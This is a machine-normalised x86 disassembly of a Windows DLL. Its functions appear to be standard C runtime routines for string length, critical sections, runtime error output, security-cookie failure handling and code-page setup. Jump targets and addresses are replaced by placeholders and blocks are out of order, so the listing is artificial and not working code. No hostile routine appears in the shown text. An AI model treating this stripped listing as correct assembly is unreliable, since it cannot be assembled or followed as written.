jb r-xdata
cmp ecx [ eax * 8 + rw-data ]
je r-xdata
lea eax [ ecx - 0x13 ]
cmp eax 0x11
ja r-xdata
lea eax [ ecx - 0xbc ]
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_10004d75
push 0x3
call sub_10006c82
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_10004dd2
push 0xff
call sub_10004dd2
pop ecx
pop ecx
push 0x3
call sub_10006c82
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_10004dae
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x17
jb r-xdata
cmp ecx [ eax * 8 + r--data ]
je r-xdata
xor eax eax
pop ebp
retn
sub_10004dd2
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_10004dae
mov edi eax
pop ecx
test edi edi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10002b9f
leave
retn
push ebx
push 0x3
call sub_10006c82
pop ecx
cmp eax 0x1
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov esi eax
test esi esi
je r-xdata
push 0x3
call sub_10006c82
pop ecx
test eax eax
jne r-xdata
pop ebx
cmp esi 0xffffffff
je r-xdata
cmp esi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
xor ebx ebx
mov ecx ebx
push r--data
push 0x314
push rw-data
call sub_10006b4f
add esp 0xc
xor ebx ebx
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x1fc ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
mov [ ebp - 0x5 ] bl
call sub_10004ff0
pop ecx
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push esi
call [ WriteFile@IAT ]
inc ecx
cmp ecx 0x1f4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10005468
int3
push 0x104
push rw-data
push ebx
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov esi 0x2fb
test eax eax
jne r-xdata
mov al [ edi + ecx * 2 ]
mov [ ebp + ecx - 0x1f8 ] al
cmp [ edi + ecx * 2 ] bx
je r-xdata
push rw-data
call sub_10006bab
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push esi
push rw-data
call sub_10006b4f
add esp 0xc
test eax eax
jne r-xdata
push r--data
push 0x314
mov esi rw-data
push esi
call sub_10006ae3
add esp 0xc
test eax eax
jne r-xdata
push rw-data
call sub_10006bab
lea ecx [ eax * 2 + rw-data ]
mov eax ecx
sub eax rw-data
push 0x3
sar eax 0x1
push r--data
sub esi eax
push esi
push ecx
call sub_10006bc4
add esp 0x14
test eax eax
jne r-xdata
push edi
push 0x314
push esi
call sub_10006ae3
add esp 0xc
test eax eax
jne r-xdata
push 0x12010
push r--data
push esi
call sub_10006cc2
add esp 0xc
jmp r-xdata
sub_10004f8d
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_10004d21
push 0x16
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
push edi
mov edi esi
sub edi ecx
mov [ esi ] cl
pop edi
test edx edx
jne r-xdata
dec edx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ esi ] dl
call sub_10004d21
push 0x22
jmp r-xdata
mov al [ ecx ]
mov [ edi + ecx ] al
inc ecx
test al al
je r-xdata
pop esi
pop ebp
retn
pop esi
mov [ eax ] esi
call sub_10005458
mov eax esi
sub_10004ff0
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_1000507b
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi * 8 + rw-data ] 0x0
jne r-xdata
push [ esi * 8 + rw-data ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push esi
call sub_10005103
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_10003cc9
sub_100050af
push esi
push edi
mov esi rw-data
mov edi esi
push ebx
add edi 0x8
cmp edi rw-data
jl r-xdata
cmp [ edi + 0x4 ] 0x1
je r-xdata
mov ebx [ edi ]
test ebx ebx
je r-xdata
pop ebx
push ebx
call [ DeleteCriticalSection@IAT ]
push ebx
call sub_100031b5
and [ edi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
pop edi
pop esi
retn
push [ esi ]
call [ DeleteCriticalSection@IAT ]
sub_10005103
push 0x8
push r--data
call sub_10004af0
cmp [ rw-data ] 0x0
jne r-xdata
mov edi [ ebp + 0x8 ]
cmp [ edi * 8 + rw-data ] 0x0
jne r-xdata
call sub_10004d75
push 0x1e
call sub_10004dd2
push 0xff
call sub_10003ba3
xor eax eax
inc eax
push 0x18
call sub_10004a10
pop ecx
mov esi eax
test esi esi
jne r-xdata
push 0xa
call sub_1000507b
pop ecx
and [ ebp - 0x4 ] 0x0
cmp [ edi * 8 + rw-data ] 0x0
jne r-xdata
call sub_10004d21
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
push esi
call sub_100031b5
pop ecx
push 0xfa0
push esi
call [ InitializeCriticalSectionAndSpinCount@IAT ]
mov [ edi * 8 + rw-data ] esi
jmp r-xdata
call sub_10004b35
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100051a1
sub_100051aa
push esi
push edi
mov esi rw-data
mov edi rw-data
add esi 0x8
cmp esi rw-data
jl r-xdata
mov [ esi ] edi
push 0xfa0
push [ esi ]
add edi 0x18
call [ InitializeCriticalSectionAndSpinCount@IAT ]
cmp [ esi + 0x4 ] 0x1
jne r-xdata
xor eax eax
pop edi
inc eax
pop esi
retn
sub_10005200
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
or eax 0x1
retn
test al al
je r-xdata
test al al
je r-xdata
add ecx 0x1
test al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
test ah ah
je r-xdata
test ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
test al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
test ah ah
jne r-xdata
mov edi edi
sub_1000528c
push 0xc
push r--data
call sub_10004af0
push 0xe
call sub_1000507b
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100052f4
call sub_10004b35
retn
mov ecx [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_100031b5
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ ecx ] eax
jne r-xdata
mov edx ecx
jmp r-xdata
mov eax [ ecx + 0x4 ]
mov [ edx + 0x4 ] eax
push ecx
call sub_100031b5
pop ecx
mov [ ebp - 0x1c ] ecx
test ecx ecx
je r-xdata
sub_100052fd
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x8 ] 0xffffffff
push edi
je r-xdata
and [ ebp - 0x320 ] 0x0
push 0x4c
lea eax [ ebp - 0x31c ]
push 0x0
push eax
call sub_10006eb0
lea eax [ ebp - 0x320 ]
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
mov [ ebp - 0x218 ] eax
lea eax [ ebp + 0x4 ]
mov [ ebp - 0x20c ] eax
mov [ ebp - 0x2d0 ] 0x10001
mov eax [ eax - 0x4 ]
mov [ ebp - 0x21c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x320 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x31c ] eax
mov eax [ ebp + 0x4 ]
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
mov edi eax
lea eax [ ebp - 0x328 ]
push eax
call sub_100049b0
pop ecx
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_10004ce5
pop ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_10002b9f
leave
retn
test edi edi
jne r-xdata
cmp [ ebp + 0x8 ] 0xffffffff
je r-xdata
push [ ebp + 0x8 ]
call sub_10004ce5
pop ecx
sub_1000542d
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10005468
int3
pop ebp
jmp eax
sub_10005468
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_100052fd
push esi
call sub_1000499b
add esp 0x10
pop esi
retn
push 0x5
pop ecx
int 0x29
sub_10005493
push ebp
mov ebp esp
push ecx
mov ax [ ebp + 0x8 ]
mov ecx 0xffff
cmp ax cx
jne r-xdata
mov ecx 0x100
cmp ax cx
jae r-xdata
xor eax eax
leave
retn
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x1
call [ GetStringTypeW@IAT ]
neg eax
sbb eax eax
and eax [ ebp - 0x4 ]
movzx eax ax
movzx ecx ax
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
jmp r-xdata
movzx ecx [ ebp + 0xc ]
and eax ecx
leave
retn
sub_100054e5
push ebp
mov ebp esp
mov ax [ ebp + 0x8 ]
push 0x30
pop ecx
cmp ax cx
jb r-xdata
or eax 0xffffffff
pop ebp
retn
cmp ax 0x3a
jae r-xdata
mov edx 0xff10
cmp ax dx
jae r-xdata
movzx eax ax
sub eax ecx
pop ebp
retn
mov ecx 0xff1a
mov edx 0x660
cmp ax dx
jb r-xdata
movzx eax ax
sub eax edx
pop ebp
retn
lea ecx [ edx + 0xa ]
cmp ax cx
jae r-xdata
mov edx 0x6f0
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
mov edx 0x966
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
mov edx 0xc66
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
mov edx 0xe50
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
add edx 0x50
cmp ax dx
jb r-xdata
add ecx 0x50
cmp ax cx
jb r-xdata
mov edx 0x1040
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
mov edx 0x17e0
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
add edx 0x30
cmp ax dx
jb r-xdata
add ecx 0x30
jmp r-xdata
cmp ax cx
jb r-xdata
sub_10005684
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
cmp [ edi + 0x78 ] 0x0
je r-xdata
mov eax [ edi + 0x80 ]
test eax eax
je r-xdata
push [ edi + 0x78 ]
call esi
cmp [ edi + 0x7c ] 0x0
je r-xdata
push eax
call esi
mov eax [ edi + 0x88 ]
test eax eax
je r-xdata
push [ edi + 0x7c ]
call esi
push 0x6
pop eax
lea ebx [ edi + 0x1c ]
mov [ ebp + 0x8 ] eax
push eax
call esi
cmp [ ebx - 0xc ] 0x0
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
add ebx 0x10
dec eax
mov [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebx - 0x4 ] 0x0
je r-xdata
push [ ebx ]
call esi
mov eax [ ebp + 0x8 ]
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0x9c ]
add eax 0xb0
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push [ ebx - 0x4 ]
call esi
mov eax [ ebp + 0x8 ]
sub_10005714
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov eax [ esi + 0x84 ]
push edi
test eax eax
je r-xdata
mov eax [ esi + 0x88 ]
test eax eax
je r-xdata
cmp eax rw-data
je r-xdata
mov eax [ esi + 0x9c ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0x78 ]
test eax eax
je r-xdata
push 0x6
pop eax
lea ebx [ esi + 0xa0 ]
lea edi [ esi + 0x1c ]
mov [ ebp + 0x8 ] eax
cmp [ eax + 0xb0 ] ebx
jne r-xdata
mov eax [ esi + 0x8c ]
sub eax 0xfe
push eax
call sub_100031b5
mov eax [ esi + 0x94 ]
mov edi 0x80
sub eax edi
push eax
call sub_100031b5
mov eax [ esi + 0x98 ]
sub eax edi
push eax
call sub_100031b5
push [ esi + 0x88 ]
call sub_100031b5
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0xc ] 0x0
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
push eax
call sub_100070a3
push [ esi + 0x9c ]
call sub_100031b5
pop ecx
pop ecx
mov eax [ esi + 0x80 ]
test eax eax
je r-xdata
add ebx 0x4
add edi 0x10
dec eax
mov [ ebp + 0x8 ] eax
jne r-xdata
mov eax [ edi - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ esi + 0x7c ]
test eax eax
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_100031b5
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
push eax
call sub_100031b5
push [ ebx ]
call sub_100031b5
pop ecx
pop ecx
push [ esi + 0x78 ]
call sub_100031b5
push [ esi + 0x84 ]
call sub_100031b5
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_100031b5
push [ esi + 0x84 ]
call sub_10006f40
pop ecx
pop ecx
push eax
call sub_100031b5
pop ecx
push eax
call sub_100031b5
push [ esi + 0x84 ]
call sub_1000703c
pop ecx
pop ecx
sub_1000586e
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
mov eax esi
pop esi
pop ebp
retn
push ebx
push edi
mov edi [ InterlockedDecrement@IAT ]
push esi
call edi
cmp [ esi + 0x78 ] 0x0
je r-xdata
mov eax [ esi + 0x80 ]
test eax eax
je r-xdata
push [ esi + 0x78 ]
call edi
cmp [ esi + 0x7c ] 0x0
je r-xdata
push eax
call edi
mov eax [ esi + 0x88 ]
test eax eax
je r-xdata
push [ esi + 0x7c ]
call edi
push 0x6
pop eax
lea ebx [ esi + 0x1c ]
mov [ ebp + 0x8 ] eax
push eax
call edi
cmp [ ebx - 0xc ] 0x0
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
add ebx 0x10
dec eax
mov [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebx - 0x4 ] 0x0
je r-xdata
push [ ebx ]
call edi
mov eax [ ebp + 0x8 ]
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov ecx [ esi + 0x9c ]
add ecx 0xb0
push ecx
call edi
pop edi
pop ebx
push [ ebx - 0x4 ]
call edi
mov eax [ ebp + 0x8 ]
sub_10005909
push 0xc
push r--data
call sub_10004af0
call sub_100039a4
mov esi eax
mov ecx [ rw-data ]
test [ esi + 0x70 ] ecx
je r-xdata
push 0xc
call sub_1000507b
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
lea eax [ esi + 0x6c ]
push eax
call sub_10005985
pop ecx
pop ecx
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000597c
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_100039a4
mov esi [ eax + 0x6c ]
mov eax esi
call sub_10004b35
retn
push 0x20
call sub_10003cc9
sub_10005985
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
jmp r-xdata
push edi
mov [ eax ] edi
call sub_10005684
pop ecx
test esi esi
je r-xdata
pop edi
pop ebp
retn
push esi
call sub_1000586e
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_10005714
pop ecx
sub_100059ee
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
sub eax 0x3a4
je r-xdata
mov eax [ r--data ]
pop ebp
retn
sub eax 0x4
je r-xdata
mov eax [ r--data ]
pop ebp
retn
sub eax 0xd
je r-xdata
mov eax [ r--data ]
pop ebp
retn
dec eax
je r-xdata
mov eax [ r--data ]
pop ebp
retn
xor eax eax
pop ebp
retn
sub_10005a28
push ebp
mov ebp esp
sub esp 0x10
lea ecx [ ebp - 0x10 ]
push 0x0
call sub_10003636
mov eax [ ebp + 0x8 ]
and [ rw-data ] 0x0
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
jmp r-xdata
cmp eax 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] 0x1
mov eax [ eax + 0x4 ]
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10005a94
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push 0x101
xor edi edi
lea esi [ ebx + 0x18 ]
push edi
push esi
call sub_10006eb0
xor eax eax
movzx ecx ax
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] edi
mov [ ebx + 0x21c ] edi
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0xc ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov edi rw-data
add esp 0xc
sub edi ebx
mov ecx 0x101
mov al [ edi + esi ]
mov [ esi ] al
inc esi
dec ecx
jne r-xdata
lea ecx [ ebx + 0x119 ]
mov edx 0x100
mov al [ ecx + edi ]
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10005afd
push ebp
mov ebp esp
sub esp 0x520
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
xor ebx ebx
mov edi 0x100
test eax eax
je r-xdata
push 0xffffff9f
lea edx [ esi + 0x119 ]
pop eax
sub eax edx
mov ecx ebx
mov [ ebp - 0x520 ] eax
mov eax ebx
cmp [ ebp - 0x51c ] 0x19
ja r-xdata
or [ esi + ecx + 0x19 ] 0x10
lea eax [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
lea ecx [ ebp - 0x512 ]
jmp r-xdata
mov [ edx ] bl
or [ esi + ecx + 0x19 ] 0x20
lea eax [ ecx - 0x20 ]
mov [ edx ] al
jmp r-xdata
test al al
jne r-xdata
add edx ecx
add eax edx
mov [ ebp - 0x51c ] eax
add eax 0x20
cmp eax 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10002b9f
leave
retn
mov eax [ ebp - 0x520 ]
inc ecx
lea edx [ esi + 0x119 ]
cmp ecx edi
jb r-xdata
movzx edx [ ecx + 0x1 ]
movzx eax al
jmp r-xdata
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x504 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push ebx
call sub_1000775a
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0x21c ]
push ebx
call sub_1000760c
add esp 0x40
lea eax [ ebp - 0x304 ]
push ebx
push [ esi + 0x4 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0x21c ]
push ebx
call sub_1000760c
add esp 0x24
mov ecx ebx
cmp eax edx
jbe r-xdata
test al 0x2
je r-xdata
or [ esi + ecx + 0x19 ] 0x10
mov al [ ebp + ecx - 0x204 ]
jmp r-xdata
cmp eax edi
jae r-xdata
add ecx 0x2
mov al [ ecx ]
mov [ esi + ecx + 0x119 ] bl
or [ esi + ecx + 0x19 ] 0x20
mov al [ ebp + ecx - 0x304 ]
mov [ esi + ecx + 0x119 ] al
jmp r-xdata
mov [ ebp + eax - 0x104 ] 0x20
inc eax
movzx eax [ ebp + ecx * 2 - 0x504 ]
test al 0x1
je r-xdata
jmp r-xdata
inc ecx
cmp ecx edi
jb r-xdata
sub_10005c8b
push 0xc
push r--data
call sub_10004af0
call sub_100039a4
mov edi eax
mov ecx [ rw-data ]
test [ edi + 0x70 ] ecx
je r-xdata
push 0xd
call sub_1000507b
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10005d27
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_10004b35
retn
push 0x20
call sub_10003cc9
cmp esi rw-data
je r-xdata
push esi
call sub_100031b5
pop ecx
sub_10005d30
push 0x10
push r--data
call sub_10004af0
or edi 0xffffffff
call sub_100039a4
mov ebx eax
mov [ ebp - 0x1c ] ebx
call sub_10005c8b
mov esi [ ebx + 0x68 ]
push [ ebp + 0x8 ]
call sub_10005a28
pop ecx
mov [ ebp + 0x8 ] eax
cmp eax [ esi + 0x4 ]
je r-xdata
xor edi edi
push 0x220
call sub_10004a10
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
call sub_10004b35
retn
mov ecx 0x88
mov eax [ ebp - 0x1c ]
mov esi [ eax + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
xor esi esi
mov [ ebx ] esi
push ebx
push [ ebp + 0x8 ]
call sub_10005ede
pop ecx
pop ecx
mov edi eax
mov [ ebp + 0x8 ] edi
test edi edi
jne r-xdata
cmp edi 0xffffffff
jne r-xdata
mov eax [ ebp - 0x1c ]
push [ eax + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
mov eax [ ebp - 0x1c ]
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ eax + 0x68 ] ebx
push ebx
call [ InterlockedIncrement@IAT ]
mov eax [ ebp - 0x1c ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov ecx [ eax + 0x68 ]
cmp ecx rw-data
je r-xdata
call sub_10004d21
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_100031b5
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push ecx
call sub_100031b5
pop ecx
mov eax [ ebp - 0x1c ]
push 0xd
call sub_1000507b
pop ecx
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x21c ]
mov [ rw-data ] eax
mov ecx esi
mov ecx esi
mov ax [ ebx + ecx * 2 + 0xc ]
mov [ ecx * 2 + rw-data ] ax
inc ecx
jmp r-xdata
mov [ ebp - 0x20 ] esi
cmp esi 0x100
jge r-xdata
mov al [ ecx + ebx + 0x18 ]
mov [ ecx + rw-data ] al
inc ecx
jmp r-xdata
mov [ ebp - 0x20 ] ecx
cmp ecx 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov al [ esi + ebx + 0x119 ]
mov [ esi + rw-data ] al
inc esi
jmp r-xdata
mov [ ebp - 0x20 ] ecx
cmp ecx 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10005ea8
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
push eax
call sub_100031b5
pop ecx
sub_10005ede
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
call sub_10005a28
mov ebx eax
pop ecx
mov [ ebp - 0x20 ] ebx
test ebx ebx
jne r-xdata
push edi
xor edi edi
mov ecx edi
mov [ ebp - 0x1c ] ecx
mov eax edi
push esi
call sub_10005a94
pop ecx
xor eax eax
jmp r-xdata
push 0x101
lea eax [ esi + 0x18 ]
push edi
push eax
call sub_10006eb0
mov edx [ ebp - 0x1c ]
add esp 0xc
imul edx edx 0x30
lea eax [ edx + rw-data ]
mov [ ebp - 0x1c ] eax
inc ecx
add eax 0x30
mov [ ebp - 0x1c ] ecx
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_10002b9f
leave
retn
inc edi
add eax 0x8
mov [ ebp - 0x1c ] eax
cmp edi 0x4
jb r-xdata
mov al [ ecx + 0x1 ]
test al al
je r-xdata
cmp [ eax + rw-data ] ebx
je r-xdata
cmp ebx 0xfde8
je r-xdata
cmp [ eax ] 0x0
mov ecx eax
je r-xdata
mov ebx [ ebp - 0x20 ]
push ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] 0x1
call sub_100059ee
add esp 0x4
mov [ esi + 0x21c ] eax
push 0x6
lea ecx [ esi + 0xc ]
lea edx [ edx + rw-data ]
pop edi
mov eax [ ebp - 0x1c ]
movzx ebx [ ecx ]
movzx eax al
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
